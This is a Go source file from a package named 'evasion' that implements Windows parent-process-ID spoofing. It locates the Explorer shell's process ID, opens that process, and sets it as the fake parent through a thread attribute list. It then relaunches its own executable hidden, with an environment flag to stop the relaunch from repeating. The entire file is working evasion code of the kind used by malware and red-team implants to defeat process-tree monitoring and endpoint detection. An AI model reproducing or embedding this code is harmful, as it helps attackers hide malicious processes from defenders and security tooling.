//go:build windows

package evasion

import (
	"errors"
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

// Win32 constants
const (
	createUnicodeEnvironment         = 0x00000400
	createNoWindow                   = 0x08000000
	extendedStartupInfoPresent       = 0x00080000
	processCreateProcess             = 0x0080
	procThreadAttributeParentProcess = 0x00020000
)

var (
	ppKernel32 = syscall.NewLazyDLL("kernel32.dll")
	ppUser32   = syscall.NewLazyDLL("user32.dll")

	procInitializeProcThreadAttributeList = ppKernel32.NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttribute         = ppKernel32.NewProc("UpdateProcThreadAttribute")
	procDeleteProcThreadAttributeList     = ppKernel32.NewProc("DeleteProcThreadAttributeList")
	procCreateProcessW                    = ppKernel32.NewProc("CreateProcessW")
	procOpenProcess                       = ppKernel32.NewProc("OpenProcess")
	procCloseHandle                       = ppKernel32.NewProc("CloseHandle")
	procGetShellWindow                    = ppUser32.NewProc("GetShellWindow")
	procGetWindowThreadProcessID          = ppUser32.NewProc("GetWindowThreadProcessId")
)

type startupInfoExW struct {
	Cb            uint32
	_             uint32
	Reserved      *uint16
	Desktop       *uint16
	Title         *uint16
	X             uint32
	Y             uint32
	XSize         uint32
	YSize         uint32
	XCountChars   uint32
	YCountChars   uint32
	FillAttribute uint32
	Flags         uint32
	ShowWindow    uint16
	Reserved2     uint16
	_             uint32
	Reserved2Ptr  *byte
	StdInput      syscall.Handle
	StdOutput     syscall.Handle
	StdError      syscall.Handle
	AttributeList uintptr
}

type processInformation struct {
	Process   syscall.Handle
	Thread    syscall.Handle
	ProcessID uint32
	ThreadID  uint32
}

func PPIDSpoof() (bool, error) {
	if os.Getenv("_TNPP") == "1" {
		return false, nil
	}

	parentPid, err := findSpoofParent()
	if err != nil {
		return false, err
	}

	hParent, err := openProcessForSpoof(parentPid)
	if err != nil {
		return false, err
	}
	defer procCloseHandle.Call(uintptr(hParent))

	attrList, cleanupAttr, err := buildParentAttributeList(hParent)
	if err != nil {
		return false, err
	}
	defer cleanupAttr()

	exePath, err := os.Executable()
	if err != nil {
		return false, fmt.Errorf("locate own executable: %w", err)
	}

	envBlock, err := buildUnicodeEnvBlock()
	if err != nil {
		return false, err
	}

	return spawnWithSpoofedParent(exePath, envBlock, attrList)
}

func findSpoofParent() (uint32, error) {
	hwnd, _, _ := procGetShellWindow.Call()
	if hwnd == 0 {
		return 0, errors.New("no shell window (likely session 0)")
	}
	var pid uint32
	procGetWindowThreadProcessID.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
	if pid == 0 {
		return 0, errors.New("shell pid not found")
	}
	return pid, nil
}

func openProcessForSpoof(pid uint32) (syscall.Handle, error) {
	h, _, errno := procOpenProcess.Call(
		processCreateProcess, 0, uintptr(pid))
	if h == 0 {
		return 0, fmt.Errorf("OpenProcess(pid=%d): %w", pid, errno)
	}
	return syscall.Handle(h), nil
}

func buildParentAttributeList(hParent syscall.Handle) (
	uintptr, func(), error,
) {
	var size uintptr
	procInitializeProcThreadAttributeList.Call(0, 1, 0,
		uintptr(unsafe.Pointer(&size)))
	if size == 0 {
		return 0, nil, errors.New("attribute list size probe failed")
	}

	buf := make([]byte, size)
	list := uintptr(unsafe.Pointer(&buf[0]))

	r, _, errno := procInitializeProcThreadAttributeList.Call(
		list, 1, 0, uintptr(unsafe.Pointer(&size)))
	if r == 0 {
		return 0, nil, fmt.Errorf("InitializeProcThreadAttributeList: %w",
			errno)
	}

	r, _, errno = procUpdateProcThreadAttribute.Call(
		list, 0,
		procThreadAttributeParentProcess,
		uintptr(unsafe.Pointer(&hParent)),
		unsafe.Sizeof(hParent),
		0, 0)
	if r == 0 {
		procDeleteProcThreadAttributeList.Call(list)
		return 0, nil, fmt.Errorf("UpdateProcThreadAttribute: %w", errno)
	}

	cleanup := func() {
		procDeleteProcThreadAttributeList.Call(list)
	}
	return list, cleanup, nil
}

func buildUnicodeEnvBlock() ([]uint16, error) {
	env := append(os.Environ(), "_TNPP=1")

	var block []uint16
	for _, entry := range env {
		u, err := syscall.UTF16FromString(entry)
		if err != nil {
			return nil, fmt.Errorf("encode env %q: %w", entry, err)
		}
		block = append(block, u...)
	}
	block = append(block, 0)
	return block, nil
}

func spawnWithSpoofedParent(exe string, envBlock []uint16,
	attrList uintptr) (bool, error) {
	cmdLine, err := syscall.UTF16FromString(`"` + exe + `"`)
	if err != nil {
		return false, fmt.Errorf("encode command line: %w", err)
	}

	var si startupInfoExW
	si.Cb = uint32(unsafe.Sizeof(si))
	si.AttributeList = attrList

	var pi processInformation

	r, _, errno := procCreateProcessW.Call(
		0, // lpApplicationName: NULL means derive from lpCommandLine
		uintptr(unsafe.Pointer(&cmdLine[0])),
		0, 0, 0,
		extendedStartupInfoPresent|createNoWindow|createUnicodeEnvironment,
		uintptr(unsafe.Pointer(&envBlock[0])),
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if r == 0 {
		return false, fmt.Errorf("CreateProcessW: %w", errno)
	}

	procCloseHandle.Call(uintptr(pi.Process))
	procCloseHandle.Call(uintptr(pi.Thread))
	return true, nil
}